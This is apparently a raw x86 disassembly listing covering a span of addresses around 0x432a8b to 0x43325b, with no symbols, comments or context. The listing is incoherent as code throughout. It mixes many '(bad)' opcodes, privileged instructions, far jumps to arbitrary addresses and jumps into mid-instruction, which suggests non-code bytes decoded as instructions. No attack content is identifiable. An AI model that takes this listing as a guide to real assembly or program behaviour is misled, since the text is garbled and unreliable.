  432a8b:	or     al,0x51
  432a8d:	push   ebp
  432a8e:	xor    ebp,esp
  432a90:	mov    esi,0x457251
  432a95:	xor    esi,eax
  432a97:	pushf  
  432a98:	inc    ebp
  432a99:	(bad)  
  432a9a:	mov    edi,eax
  432a9c:	or     al,0x85
  432a9e:	add    al,bh
  432aa0:	inc    eax
  432aa2:	mov    esi,DWORD PTR [ebx+ecx*4-0x75]
  432aa6:	or     ah,bh
  432aa8:	inc    eax
  432aa9:	push   esp
  432aaa:	jmp    0x432afd
  432aac:	mov    eax,DWORD PTR ds:0xe8720c
  432ab2:	mov    DWORD PTR [ebp-0x8],eax
  432ab5:	jne    0x432afc
  432ab7:	jmp    0x432a44
  432ab9:	mov    ebp,DWORD PTR [eax]
  432abb:	clc    
  432abc:	retf   0xff54
  432abf:	push   ecx
  432ac0:	mov    DWORD PTR ds:0x757210,eax
  432ac6:	mov    ecx,DWORD PTR [ebp-0x4]
  432ac9:	sub    esp,DWORD PTR [ebx-0x77]
  432acc:	dec    DWORD PTR [eax*4-0x74ca8abb]
  432ad3:	or     ah,bh
  432ad5:	pop    es
  432ad6:	ds fwait
  432ad8:	push   DWORD PTR [edx]
  432ada:	mov    ecx,DWORD PTR [ebx+0x4dc708f0]
  432ae0:	(bad)  
  432ae1:	mov    bh,bh
  432ae3:	jmp    0x432ad1
  432ae5:	leave  
  432ae6:	jne    0x432af0
  432ae8:	call   0x302442
  432aed:	in     al,dx
  432aee:	dec    ebp
  432aef:	add    dh,BYTE PTR [ebx]
  432af1:	add    BYTE PTR [ebx],al
  432af3:	inc    ebp
  432af4:	cmp    esi,DWORD PTR [ecx]
  432af6:	je     0x432a94
  432af8:	mov    eax,edi
  432afa:	or     al,0xf0
  432afc:	add    BYTE PTR [ebp+0x458bf845],al
  432b02:	or     BYTE PTR [ebx-0x3f7cf7b3],cl
  432b08:	adc    al,0x7
  432b0a:	enter  0x9fc0,0xa5
  432b0e:	rol    BYTE PTR [eax],0x5e
  432b11:	mov    ecx,ecx
  432b13:	or     al,0xc
  432b15:	ror    BYTE PTR [ebx+0x408df8f2],0xe4
  432b1c:	jmp    0x432b1d
  432b1e:	push   ebp
  432b1f:	mov    esp,ebp
  432b21:	cld    
  432b22:	inc    ebp
  432b23:	inc    ebp
  432b24:	or     DWORD PTR [ecx+0x457dec10],0x0
  432b2b:	push   esi
  432b2c:	push   esi
  432b2d:	mov    edi,0x7af080f
  432b32:	add    bh,al
  432b34:	test   DWORD PTR [ebx+0x3a7320f],ebx
  432b3a:	add    BYTE PTR [ecx+0x4540100f],cl
  432b40:	mov    ebp,eax
  432b42:	mov    ebp,edi
  432b44:	lock call edx
  432b47:	fcom   DWORD PTR [ebp+0x45]
  432b4a:	mov    eax,0x148a8b
  432b4f:	push   ecx
  432b50:	enter  0xc145,0x83
  432b54:	cmp    ecx,DWORD PTR [eax]
  432b56:	add    BYTE PTR [ebp+0x4d],al
  432b59:	mov    eax,DWORD PTR [ebx+0x3340fcf8]
  432b5f:	call   0xffa326ce
  432b64:	cmp    eax,DWORD PTR [ebp-0xc]
  432b67:	jmp    DWORD PTR [eax+edx*1-0x4e]
  432b6b:	push   ebp
  432b6c:	(bad)  
  432b6d:	call   0x342971
  432b72:	mov    bh,0xdb
  432b74:	cld    
  432b75:	or     BYTE PTR [ebp+0x45],bl
  432b78:	(bad)  
  432b79:	call   0xff7d2809
  432b7e:	add    al,BYTE PTR [ebp+0x37]
  432b81:	xor    esi,DWORD PTR [edi+0x4e50bf03]
  432b87:	jne    0x432b89
  432b89:	(bad)  
  432b8a:	cmp    edi,esp
  432b8c:	jne    0x432bbf
  432b8e:	mov    edi,edi
  432b90:	or     BYTE PTR [ebx-0x307f0b49],cl
  432b96:	pop    ds
  432b97:	into   
  432b98:	je     0x432b5b
  432b9a:	mov    ebx,DWORD PTR [esi]
  432b9c:	or     BYTE PTR [ebp-0x49],al
  432b9f:	mov    esp,DWORD PTR [esi-0x77]
  432ba2:	mov    esi,0x2451f0c
  432ba7:	mov    eax,DWORD PTR [eax]
  432ba9:	or     al,0x66
  432bab:	sar    bl,0x3b
  432bae:	xor    esi,DWORD PTR [ebp+0x66]
  432bb1:	xor    ecx,edi
  432bb3:	pop    edi
  432bb4:	adc    bl,BYTE PTR [ebx+0x7e]
  432bb7:	ret    0xff
  432bba:	cld    
  432bbb:	inc    ebp
  432bbc:	mov    ecx,DWORD PTR [ebx-0xec6e70c]
  432bc2:	cld    
  432bc3:	mov    ebp,DWORD PTR [ebx+ecx*4-0x13baf3fa]
  432bca:	push   0xffffff83
  432bcc:	pop    edi
  432bcd:	or     BYTE PTR [ebp+0x53],dh
  432bd0:	xorps  xmm1,xmm2
  432bd3:	test   BYTE PTR [eax+eax*1],bh
  432bd6:	add    BYTE PTR [eax],al
  432bd8:	adc    eax,eax
  432bda:	add    DWORD PTR [esi+edi*2-0xff7b00],0xffffffb7
  432be2:	jmp    DWORD PTR [eax]
  432be4:	ror    al,0x5e
  432be7:	inc    ebp
  432be8:	leave  
  432be9:	xor    ecx,DWORD PTR [eax]
  432beb:	and    DWORD PTR [ebx-0x3ec30708],ecx
  432bf1:	add    ah,al
  432bf3:	xor    edi,edi
  432bf5:	xor    DWORD PTR [ebx],0x66003302
  432bfb:	mov    DWORD PTR [ebp-0xc],ecx
  432bfe:	pcmpgtw mm0,mm0
  432c01:	add    dl,ah
  432c03:	leave  
  432c04:	mov    edi,DWORD PTR [ebx+eax*4+0x66]
  432c08:	push   eax
  432c09:	dec    ebp
  432c0a:	mov    esi,DWORD PTR [ebx-0x75]
  432c0d:	lea    ebp,[eax-0x7c00ff02]
  432c13:	xor    eax,DWORD PTR [eax]
  432c15:	sysret 
  432c17:	dec    ebp
  432c18:	ror    BYTE PTR [ebx+0xc000c30],0x6a
  432c1f:	push   WORD PTR [ecx+0x8]
  432c23:	jne    0x432be6
  432c25:	ud0    ecx,DWORD PTR [ecx]
  432c28:	mov    eax,edx
  432c2a:	lods   al,BYTE PTR ds:[esi]
  432c2b:	add    BYTE PTR [eax],al
  432c2d:	data16 (bad) 
  432c2f:	iret   
  432c30:	and    cl,BYTE PTR [eax*2+0x440f8d5d]
  432c37:	cli    
  432c38:	inc    ebp
  432c39:	cmp    al,0x8d
  432c3b:	add    BYTE PTR [esi+0x2d],ah
  432c3e:	inc    ebp
  432c3f:	pop    ebp
  432c40:	lea    ecx,[edi]
  432c42:	mov    dl,bh
  432c44:	add    BYTE PTR [edi],cl
  432c46:	mov    DWORD PTR [eax+eax*8],edi
  432c49:	mov    ebx,0x3b87
  432c4e:	add    BYTE PTR [ebx],ch
  432c50:	inc    ebp
  432c51:	data16 (bad) 
  432c53:	clc    
  432c54:	int3   
  432c55:	cmp    eax,DWORD PTR [eax]
  432c57:	je     0x432be2
  432c59:	push   0xffffffc8
  432c5b:	pop    edi
  432c5c:	xchg   DWORD PTR [ebp+0x0],eax
  432c5f:	data16 add BYTE PTR [ebp+0x45],cl
  432c63:	lea    cx,[ebp+0x10]
  432c67:	jb     0x432c69
  432c69:	jmp    0x432bf4
  432c6b:	call   eax
  432c6d:	clc    
  432c6e:	xchg   DWORD PTR [edi+0x1],edi
  432c71:	mov    eax,DWORD PTR [eax]
  432c73:	or     BYTE PTR [ebp-0x49],al
  432c76:	lea    eax,[eax+0x74003154]
  432c7c:	push   edi
  432c7d:	inc    edx
  432c7e:	jge    0x432c7f
  432c80:	mov    DWORD PTR [edi],ecx
  432c82:	fdiv   DWORD PTR [edi-0x6]
  432c85:	inc    DWORD PTR [eax]
  432c87:	xor    edx,DWORD PTR [eax+0x5f]
  432c8a:	xchg   DWORD PTR [ebx+0x1],ebx
  432c8d:	ret    0x0
  432c90:	xor    BYTE PTR [ebp-0x51],cl
  432c93:	cmp    edi,0xf0ff89fe
  432c99:	data16 ror al,0x84
  432c9d:	rol    BYTE PTR [eax],0x3b
  432ca0:	add    al,dh
  432ca2:	dec    eax
  432ca3:	xchg   esp,eax
  432ca4:	push   ebx
  432ca5:	jmp    0x432c32
  432ca7:	push   ebp
  432ca8:	add    esp,ebp
  432caa:	add    ebp,esp
  432cac:	mov    edx,DWORD PTR [edi+0x24]
  432caf:	clc    
  432cb0:	dec    esi
  432cb1:	xchg   DWORD PTR [ebx+0x5e002001],ecx
  432cb7:	cmp    BYTE PTR [ebx],al
  432cb9:	jne    0x432c44
  432cbb:	xor    esp,eax
  432cbd:	jmp    0x462e40
  432cc2:	add    ebp,DWORD PTR [ecx+ecx*4]
  432cc5:	jne    0x432cbb
  432cc7:	call   0xffcd2a21
  432ccc:	clc    
  432ccd:	xchg   edi,eax
  432cce:	sti    
  432ccf:	add    DWORD PTR [ebx],eax
  432cd1:	add    BYTE PTR [ebp+0x47],bl
  432cd4:	xor    ecx,DWORD PTR [ecx+0x47e8b489]
  432cda:	pop    ebp
  432cdb:	mov    DWORD PTR [esi-0x48],esi
  432cde:	jmp    0x432d27
  432ce0:	mov    ecx,DWORD PTR [ecx-0x7882431c]
  432ce6:	(bad)  
  432ce8:	cmp    al,0x0
  432cea:	cmp    eax,DWORD PTR [ebp+0x18]
  432ced:	lea    ebx,[ebp-0x56]
  432cf0:	jle    0x432cf2
  432cf2:	jae    0x432c7d
  432cf4:	mov    eax,esp
  432cf6:	call   0xb900:0x8b005587
  432cfd:	inc    ebp
  432cfe:	push   ebp
  432cff:	lea    ecx,[ebp-0x27ff4f12]
  432d05:	mov    eax,edi
  432d07:	int3   
  432d08:	push   ebp
  432d09:	xchg   edi,eax
  432d0b:	add    esp,ebp
  432d0d:	add    BYTE PTR [eax],al
  432d0f:	inc    ebp
  432d10:	add    BYTE PTR [ebp+0x8b3255],cl
  432d16:	cld    
  432d17:	mov    DWORD PTR [edx],edi
  432d19:	aam    0x75
  432d1b:	xchg   DWORD PTR [ebx+0x3400dc01],ecx
  432d21:	mov    DWORD PTR [ebx-0x50],edx
  432d24:	test   BYTE PTR [ebp-0x1],0xe8
  432d28:	mov    eax,DWORD PTR [eax]
  432d2a:	hlt    
  432d2b:	add    al,al
  432d2d:	mov    eax,DWORD PTR ds:0x890045a8
  432d33:	dec    DWORD PTR [ebx+0x45fdf0e8]
  432d39:	inc    DWORD PTR [eax*2+0xf75854d]
  432d40:	mov    ebp,DWORD PTR [ebp-0x7476ff18]
  432d46:	call   0x72998a87
  432d4b:	je     0x432dab
  432d4d:	js     0x432dae
  432d4f:	lock ret 0x7e
  432d53:	mov    ecx,DWORD PTR [ebx+0x8568b1c]
  432d59:	mov    edi,edi
  432d5b:	sbb    al,bl
  432d5d:	clc    
  432d5e:	add    BYTE PTR [ebp-0x73],bh
  432d61:	mov    ebx,DWORD PTR [eax-0x7437ffec]
  432d67:	ror    BYTE PTR [eax],1
  432d69:	dec    ebp
  432d6a:	xchg   ebp,eax
  432d6b:	mov    edi,edi
  432d6d:	in     al,0x8b
  432d6f:	jge    0x432cfa
  432d71:	cmp    ecx,DWORD PTR [ebx+0x39893377]
  432d77:	clc    
  432d78:	pop    esi
  432d79:	fist   DWORD PTR [ebp+0x5d398b5d]
  432d7f:	clc    
  432d80:	add    al,0x6e
  432d82:	mov    eax,DWORD PTR [ebx]
  432d84:	mov    BYTE PTR [ebp+0x0],dl
  432d87:	mov    edx,DWORD PTR [ebx-0x20]
  432d8a:	adc    esi,DWORD PTR [edi+0x5e005f3c]
  432d90:	add    eax,0x3b3b73
  432d95:	adc    al,0x89
  432d97:	pop    eax
  432d98:	sbb    DWORD PTR [edx+eax*1],0xffffff8b
  432d9c:	ret    0xf08
  432d9f:	cmp    al,0x2
  432da1:	mov    edx,eax
  432da3:	cld    
  432da4:	add    BYTE PTR [ebp+0x66],dl
  432da7:	add    eax,ebx
  432da9:	add    esp,eax
  432dab:	sub    eax,eax
  432dad:	or     BYTE PTR [ecx-0x77f474bb],cl
  432db3:	add    BYTE PTR [eax],al
  432db5:	mov    DWORD PTR [ebx-0x24],ebx
  432db8:	push   edi
  432db9:	push   ebp
  432dba:	clc    
  432dbb:	add    DWORD PTR [esi+0x1b0100],0x45
  432dc2:	out    0xff,eax
  432dc4:	add    edx,DWORD PTR [eax]
  432dc6:	jmp    0x432db0
  432dc8:	cmp    ch,0x46
  432dcb:	(bad)  
  432dcc:	jmp    0x40c8b61e
  432dd1:	je     0x432d5d
  432dd3:	mov    eax,DWORD PTR [eax-0x10c78104]
  432dd9:	inc    ebp
  432dda:	add    BYTE PTR [ebx-0x770375],al
  432de0:	add    ah,ch
  432de2:	add    edx,esp
  432de4:	pop    edi
  432de5:	pop    ebp
  432de6:	push   ebp
  432de7:	inc    ebx
  432de8:	in     al,dx
  432de9:	pop    ebp
  432dea:	in     al,dx
  432deb:	cmp    edx,DWORD PTR [edi-0x8]
  432dee:	xor    DWORD PTR [esp+ebx*4-0x173676a5],edx
  432df5:	add    al,0x47
  432df7:	push   ebp
  432df8:	mov    esp,ebp
  432dfa:	in     al,0x45
  432dfc:	dec    ebp
  432dfd:	push   esi
  432dfe:	test   DWORD PTR [eax+0xfb010f],esi
  432e04:	add    BYTE PTR [eax+0xc018b],dh
  432e0a:	leave  
  432e0b:	inc    ebp
  432e0c:	test   al,ch
  432e0e:	add    dh,bh
  432e10:	add    bh,bh
  432e12:	dec    ebp
  432e13:	push   cs
  432e14:	mov    DWORD PTR [ecx],eax
  432e16:	hlt    
  432e17:	push   es
  432e18:	dec    ebp
  432e19:	leave  
  432e1a:	mov    DWORD PTR [eax],ecx
  432e1c:	clc    
  432e1d:	cmovge eax,ecx
  432e20:	mov    ecx,0x85c2f0
  432e26:	clc    
  432e27:	pop    DWORD PTR [ebp+0x1]
  432e2a:	push   ebx
  432e2b:	add    BYTE PTR [ebp-0x15],bh
  432e2e:	push   esi
  432e2f:	xor    eax,0x898a45
  432e34:	cld    
  432e35:	add    al,BYTE PTR [ebp+0x0]
  432e38:	xor    esp,DWORD PTR [esi-0x64]
  432e3b:	add    DWORD PTR [esi+0x78308c1],edi
  432e41:	add    ah,BYTE PTR [ebp-0x49]
  432e44:	int    0xbb
  432e46:	mov    ecx,DWORD PTR [esi+0xc]
  432e49:	add    dh,al
  432e4b:	cmp    ecx,ebx
  432e4d:	jne    0x432e17
  432e4f:	xor    ecx,DWORD PTR [ebp+0x66]
  432e52:	jmp    0xca2e58
  432e57:	add    DWORD PTR [ebp+0x0],eax
  432e5a:	mov    eax,ebx
  432e5c:	or     al,0x8b
  432e5e:	(bad)  
  432e5f:	mov    ecx,esi
  432e61:	mov    BYTE PTR [eax+eax*1+0x664c136],cl
  432e68:	mov    eax,edi
  432e6a:	or     BYTE PTR [edx],cl
  432e6c:	shl    cl,cl
  432e6e:	icebp  
  432e6f:	add    BYTE PTR [ebp+0x38],0x8b
  432e73:	or     BYTE PTR [edx+eax*2],cl
  432e76:	(bad)  
  432e77:	or     cl,dh
  432e79:	stc    
  432e7a:	shl    DWORD PTR [ebp-0x30],0xc6
  432e7e:	xor    al,0x0
  432e80:	inc    ebp
  432e81:	xchg   BYTE PTR [ebx],al
  432e83:	add    esp,edi
  432e85:	add    BYTE PTR [ebp-0x39],cl
  432e88:	mov    al,bl
  432e8a:	test   DWORD PTR [ebx+0x1c348375],ecx
  432e90:	sub    al,0xbf
  432e92:	jmp    0x432e19
  432e94:	mov    edi,eax
  432e96:	lock jge 0x432e8a
  432e99:	lea    esi,[edx-0x74bad5ff]
  432e9f:	mov    ebp,esp
  432ea1:	or     cl,dh
  432ea3:	leave  
  432ea4:	add    al,BYTE PTR [eax+eax*4-0x37ff9b00]
  432eab:	dec    ebp
  432eac:	dec    ebp
  432ead:	test   DWORD PTR [ebx],eax
  432eaf:	paddb  mm6,mm0
  432eb2:	add    DWORD PTR [eax],eax
  432eb4:	dec    ebp
  432eb5:	mov    ecx,DWORD PTR [ebx-0x64b217f0]
  432ebb:	mov    esi,DWORD PTR [edx]
  432ebd:	or     al,0x2b
  432ebf:	dec    ebp
  432ec0:	xor    ecx,DWORD PTR [ebx+0x4575083b]
  432ec6:	mov    esp,edi
  432ec8:	adc    BYTE PTR [ebp+edx*2+0x33ec3389],bl
  432ecf:	mov    DWORD PTR [ebx],ebp
  432ed1:	call   0xc76b801
  432ed6:	mov    DWORD PTR [ebp+0x10],ecx
  432ed9:	(bad)  
  432eda:	push   0x8b85ff10
  432edf:	clc    
  432ee0:	or     al,0x54
  432ee2:	(bad)  
  432ee3:	push   ecx
  432ee4:	retf   
  432ee5:	mov    ebx,0xff4d8dc8
  432eea:	mov    DWORD PTR [ebp+0x8],eax
  432eed:	xor    eax,DWORD PTR [ebp-0x75]
  432ef0:	cmp    ebp,DWORD PTR [ebx]
  432ef2:	lsl    ebx,WORD PTR [edi-0x8]
  432ef6:	call   DWORD PTR [ebx-0x741bff75]
  432efc:	(bad)  
  432efd:	or     al,0x5b
  432eff:	dec    ebp
  432f00:	or     BYTE PTR [ebx],dh
  432f02:	inc    ebp
  432f03:	xor    esi,DWORD PTR ds:0x708088d
  432f09:	in     eax,0x9b
  432f0b:	add    BYTE PTR [edx],dh
  432f0d:	inc    ebp
  432f0e:	pop    edi
  432f0f:	xor    eax,edx
  432f11:	test   DWORD PTR [eax],0x81108b8b
  432f17:	dec    ebp
  432f18:	sub    al,0x33
  432f1a:	add    BYTE PTR [ebx],dh
  432f1c:	push   esi
  432f1d:	sub    ecx,DWORD PTR [ebx-0x768accc5]
  432f23:	mov    edi,eax
  432f25:	or     BYTE PTR [ebp+0x45],al
  432f28:	mov    DWORD PTR [ebx+0x45f4ec],ecx
  432f2e:	xor    ecx,ecx
  432f30:	pushf  
  432f31:	push   es
  432f32:	mov    DWORD PTR [esi-0x4],0xf8178538
  432f39:	dec    ebp
  432f3a:	inc    ebp
  432f3b:	cmp    BYTE PTR [ecx],0x54
  432f3e:	pushf  
  432f3f:	gs (bad) 
  432f41:	shl    esp,1
  432f43:	dec    ebp
  432f44:	xchg   BYTE PTR [eax-0x3dbaab08],al
  432f4a:	shr    ecx,1
  432f4c:	xlat   BYTE PTR ds:[ebx]
  432f4d:	rol    bh,cl
  432f4f:	mov    edx,esp
  432f51:	or     BYTE PTR [ebp+0x4588f84d],al
  432f57:	mov    ecx,DWORD PTR [eax]
  432f59:	or     BYTE PTR [eax],al
  432f5b:	push   ebp
  432f5c:	mov    edi,DWORD PTR [eax+0xfc728b]
  432f62:	dec    ebp
  432f63:	enter  0xceba,0x8
  432f67:	retf   0x1807
  432f6a:	ret    0x9b4d
  432f6d:	mov    esi,DWORD PTR [edx]
  432f6f:	or     al,0x33
  432f71:	into   
  432f72:	add    edx,esi
  432f74:	add    ecx,edx
  432f76:	bswap  eax
  432f78:	ror    esi,0x98
  432f7b:	dec    ebp
  432f7c:	add    cl,ch
  432f7e:	mov    edi,edi
  432f80:	hlt    
  432f81:	inc    esi
  432f83:	inc    ebp
  432f84:	ret    0x4533
  432f87:	mov    ecx,DWORD PTR [ebx+0x4d03fc2b]
  432f8d:	or     BYTE PTR [ebx],dh
  432f8f:	dec    ebp
  432f90:	xor    ecx,DWORD PTR [ebx-0x38fceffd]
  432f96:	jne    0xff8d2f5d
  432f9c:	inc    ebp
  432f9d:	inc    ebp
  432f9e:	mov    esi,DWORD PTR [ebx]
  432fa0:	clc    
  432fa1:	pop    esi
  432fa2:	ret    0xcaeb
  432fa5:	mov    eax,esi
  432fa7:	call   0x5204847a
  432fac:	dec    ebp
  432fad:	add    eax,0xf8728b
  432fb2:	adc    eax,0xce0ccac9
  432fb7:	push   ebp
  432fb8:	ret    0xc6ec
  432fbb:	in     al,dx
  432fbc:	call   0x33437cc5
  432fc1:	push   edi
  432fc2:	add    edi,eax
  432fc4:	xor    eax,eax
  432fc6:	jmp    0x43300d
  432fc8:	xor    ecx,DWORD PTR [ecx+0x4503f433]
  432fce:	add    eax,edi
  432fd0:	shr    eax,cl
  432fd2:	mov    DWORD PTR [ebp+0x4545f8f8],eax
  432fd8:	mov    esi,DWORD PTR [edx]
  432fda:	in     al,dx
  432fdb:	pushf  
  432fdc:	ret    0x84c7
  432fdf:	fcomp  DWORD PTR [ebx-0x7607cd7b]
  432fe5:	inc    ebp
  432fe6:	in     al,dx
  432fe7:	xor    DWORD PTR [ebp-0x64],eax
  432fea:	mov    eax,edi
  432fec:	cld    
  432fed:	fmul   st(2),st
  432fef:	sbb    dl,al
  432ff1:	jmp    0x9c3b:0x304d45c1
  432ff8:	jbe    0x432fc1
  432ffa:	mov    esp,eax
  432ffc:	clc    
  432ffd:	add    BYTE PTR [ebp+0x0],cl
  433000:	mov    ecx,ecx
  433002:	lea    eax,[ebp-0x5]
  433005:	mov    edi,edi
  433007:	call   0x51ce8451
  43300c:	hlt    
  43300d:	xor    eax,edx
  43300f:	mov    esi,0x9b7284
  433014:	xor    cl,dl
  433016:	mov    esi,eax
  433018:	hlt    
  433019:	into   
  43301a:	inc    ebp
  43301b:	scas   eax,DWORD PTR es:[edi]
  43301c:	mov    ebp,ecx
  43301e:	cld    
  43301f:	add    dl,cl
  433021:	add    dl,al
  433023:	inc    ebp
  433024:	shr    DWORD PTR [ebx],0x4d
  433027:	xor    edi,DWORD PTR [ebx]
  433029:	mov    DWORD PTR [edi],ecx
  43302b:	clc    
  43302c:	dec    esi
  43302d:	inc    ebp
  43302e:	dec    DWORD PTR [ebx-0x3d2b1775]
  433034:	ret    0xc6ca
  433037:	mov    BYTE PTR [ebp-0x32],0x53
  43303b:	scas   eax,DWORD PTR es:[edi]
  43303c:	inc    ebp
  43303d:	jmp    0x43306f
  43303f:	mov    ebx,DWORD PTR [esp+edi*8+0x335b4d8b]
  433046:	pop    ebx
  433047:	xor    ecx,DWORD PTR [ebp+0x3]
  43304a:	mov    eax,DWORD PTR [ebx]
  43304c:	clc    
  43304d:	test   edx,ecx
  43304f:	mov    ecx,esi
  433051:	cld    
  433052:	call   0x8ab7759c
  433057:	xor    ecx,DWORD PTR [eax+0x4533f303]
  43305d:	add    ecx,DWORD PTR [ebx-0x4974072d]
  433063:	fdiv   QWORD PTR [ebx]
  433065:	retf   0xce89
  433068:	in     al,0xc1
  43306a:	inc    ebp
  43306b:	or     cl,BYTE PTR [ebx-0x3d3d1b36]
  433071:	into   
  433072:	mov    dh,0xc1
  433075:	call   0x8c1775fe
  43307a:	(bad)  
  43307b:	cld    
  43307c:	mov    ecx,DWORD PTR [ebp-0x14]
  43307f:	xor    eax,ecx
  433081:	lea    eax,[ebp+0x8]
  433084:	mov    esi,DWORD PTR [edx-0x4]
  433087:	add    dl,al
  433089:	inc    ebp
  43308a:	mov    esp,0x32d89b8b
  43308f:	dec    ebp
  433090:	mov    esi,DWORD PTR [ebx]
  433092:	cld    
  433093:	xor    eax,edx
  433095:	sub    esp,DWORD PTR [ebp-0x75]
  433098:	int    0xec
  43309a:	sub    ecx,eax
  43309c:	add    esp,DWORD PTR [ecx-0x74b2ba20]
  4330a2:	mov    esi,esp
  4330a4:	call   0x34177e2d
  4330a9:	inc    DWORD PTR [ebx]
  4330ab:	mov    edi,DWORD PTR [ebx]
  4330ad:	cld    
  4330ae:	jne    0x4330fd
  4330b0:	mov    esi,DWORD PTR [ebx]
  4330b2:	aam    0x8d
  4330b4:	dec    ebp
  4330b5:	or     BYTE PTR [ebx],dh
  4330b7:	jb     0x4330bc
  4330b9:	add    BYTE PTR [edi+0x45],bl
  4330bc:	ror    DWORD PTR [ebx+0x4d55e4c9],0xec
  4330c3:	xor    ebp,esp
  4330c5:	xor    eax,edi
  4330c7:	sub    edi,esp
  4330c9:	mov    eax,DWORD PTR [ebp+0x32c8f8f4]
  4330cf:	xchg   BYTE PTR [edi+edi*8+0x45e8ff89],bl
  4330d6:	inc    ebp
  4330d7:	xor    ecx,DWORD PTR [ecx+0x45891403]
  4330dd:	clc    
  4330de:	mov    eax,edi
  4330e0:	nop
  4330e1:	fadd   QWORD PTR [eax]
  4330e3:	xchg   BYTE PTR [ebx+0xdb14f8],cl
  4330e9:	jmp    0x433074
  4330eb:	mov    eax,DWORD PTR [ecx]
  4330ed:	fadd   DWORD PTR [eax]
  4330ef:	inc    ebp
  4330f0:	or     DWORD PTR [ebx],esi
  4330f2:	dec    eax
  4330f3:	add    edx,DWORD PTR [ebx-0x2d]
  4330f6:	dec    ebp
  4330f7:	mov    DWORD PTR [ebx+0x5707fcec],ecx
  4330fd:	inc    ebp
  4330fe:	push   esp
  4330ff:	mov    dl,BYTE PTR [ecx-0xd]
  433102:	xor    ecx,DWORD PTR [ebp-0x45]
  433105:	(bad)  
  433107:	rol    BYTE PTR [eax],0xc1
  43310a:	ret    
  43310b:	inc    ebp
  43310c:	inc    ebp
  43310d:	mov    ecx,DWORD PTR [ebx-0x38b20324]
  433113:	xor    eax,ebx
  433115:	add    eax,DWORD PTR [ebp+0x23]
  433118:	mov    ecx,DWORD PTR [ebx-0x4bf7a08]
  43311e:	cmp    edi,0xc
  433121:	dec    ebp
  433122:	inc    ebp
  433123:	xor    ecx,DWORD PTR [ebx+0x40f8f889]
  433129:	inc    ebp
  43312a:	mov    esi,DWORD PTR [ebx]
  43312c:	clc    
  43312d:	lea    eax,[ebp+0x45725407]
  433133:	add    BYTE PTR [ebp+eax*2-0x75],dh
  433137:	xor    edi,DWORD PTR [eax]
  433139:	mov    ecx,0xff8b8d4d
  43313e:	push   esp
  43313f:	enter  0x4df7,0x23
  433143:	mov    DWORD PTR [ebx+0x4045f8e0],ecx
  433149:	mov    eax,DWORD PTR [ebx]
  43314b:	loopne 0x433138
  43314d:	ret    0xc68b
  433150:	push   esp
  433151:	enter  0x9745,0x8b
  433155:	inc    ebp
  433156:	cld    
  433157:	mov    eax,edi
  433159:	clc    
  43315a:	ret    
  43315b:	ret    0xc645
  43315e:	mov    esi,DWORD PTR [ebx]
  433160:	cld    
  433161:	pop    esi
  433162:	mov    ebx,0x83458bc3
  433168:	mov    ebp,DWORD PTR [esp+edi*8+0x45]
  43316c:	dec    ebp
  43316d:	xor    DWORD PTR [ebx],esi
  43316f:	pushf  
  433170:	add    edi,DWORD PTR [edx-0x7767a77]
  433176:	fcom   DWORD PTR [ebp+0x45]
  433179:	mov    esi,DWORD PTR [ebx]
  43317b:	adc    al,0x9c
  43317d:	inc    ebp
  43317e:	(bad)  
  43317f:	mov    ebx,eax
  433181:	adc    al,0x85
  433183:	cmp    al,0x1
  433186:	inc    ebp
  433187:	add    BYTE PTR ds:0xe98b9c4d,bh
  43318d:	mov    eax,DWORD PTR [ebx]
  43318f:	nop
  433190:	add    BYTE PTR [eax],al
  433192:	inc    ebp
  433193:	mov    esi,DWORD PTR [ebx]
  433195:	add    eax,DWORD PTR [ebx]
  433197:	cmp    al,0x89
  433199:	mov    esp,esi
  43319b:	clc    
  43319c:	inc    ebp
  43319d:	inc    ebp
  43319e:	add    edx,DWORD PTR [esi+0xc]
  4331a1:	mov    edi,0x7ff0845
  4331a6:	in     al,dx
  4331a7:	(bad)  
  4331a8:	jne    0x433145
  4331aa:	mov    esi,DWORD PTR [edx]
  4331ac:	clc    
  4331ad:	add    ebp,DWORD PTR [esi]
  4331af:	mov    edi,edi
  4331b1:	in     al,dx
  4331b2:	mov    DWORD PTR [ebp-0x10],eax
  4331b5:	xor    eax,DWORD PTR [ebp+0x3]
  4331b8:	cmp    DWORD PTR [ecx+0x458bf49c],ecx
  4331be:	fmul   DWORD PTR [ebx-0x173caf39]
  4331c4:	lea    ecx,[ecx+0x45e8d4bc]
  4331ca:	clc    
  4331cb:	mov    edi,edi
  4331cd:	cmp    BYTE PTR [ebp+0x4d],al
  4331d0:	test   DWORD PTR [eax+0x74],ecx
  4331d3:	inc    ecx
  4331d4:	mov    ecx,DWORD PTR [ebx+0x18c7f8d8]
  4331da:	ret    
  4331db:	inc    eax
  4331dc:	dec    DWORD PTR [ebx+0x4945f8f0]
  4331e2:	push   eax
  4331e3:	dec    eax
  4331e4:	test   al,0xd0
  4331e6:	dec    eax
  4331e8:	mov    eax,DWORD PTR [ebp-0x14]
  4331eb:	mov    eax,DWORD PTR [ebp+0x38]
  4331ee:	mov    eax,ecx
  4331f0:	fadd   DWORD PTR [ebx]
  4331f2:	dec    ebp
  4331f3:	inc    eax
  4331f4:	sub    ecx,DWORD PTR [ecx+0x45d81489]
  4331fa:	inc    ebp
  4331fb:	xor    ecx,DWORD PTR [ebx+0x4089f003]
  433201:	fadd   QWORD PTR [ebx]
  433203:	inc    ebp
  433204:	or     al,0x33
  433206:	dec    ebp
  433207:	add    edi,DWORD PTR [ebx]
  433209:	mov    DWORD PTR [edx-0x28],esi
  43320c:	mov    eax,DWORD PTR [ebp-0x10]
  43320f:	mov    eax,DWORD PTR [eax+0x10]
  433212:	mov    eax,edi
  433214:	lock ret 
  433216:	inc    ecx
  433217:	add    DWORD PTR [ebx-0x3e3827ab],ecx
  43321d:	fsubr  st,st(5)
  43321f:	test   DWORD PTR [eax],eax
  433221:	clc    
  433222:	push   0x45
  433224:	(bad)  
  433225:	cmp    al,0xec
  433227:	pushf  
  433228:	inc    ebp
  433229:	(bad)  
  43322a:	push   eax
  43322b:	fsub   DWORD PTR [eax-0x7b]
  43322e:	(bad)  
  43322f:	clc    
  433230:	mov    eax,0xf8008584
  433235:	mov    eax,DWORD PTR [ebp-0x4]
  433238:	mov    edi,0x4585c3cc
  43323e:	clc    
  43323f:	mov    eax,DWORD PTR [ebp+0x14]
  433242:	xor    eax,DWORD PTR [ebp-0x64]
  433245:	mov    edi,eax
  433247:	in     al,dx
  433248:	les    esi,FWORD PTR [ebp-0x7b]
  43324b:	mov    edi,eax
  43324d:	or     al,0x4d
  43324f:	dec    ebp
  433250:	mov    eax,ebp
  433252:	in     al,0xf2
  433254:	dec    ebp
  433255:	dec    DWORD PTR [ecx+0x4dc7e045]
  43325b:	fmul   DWORD PTR [ecx+0x4df8f085]
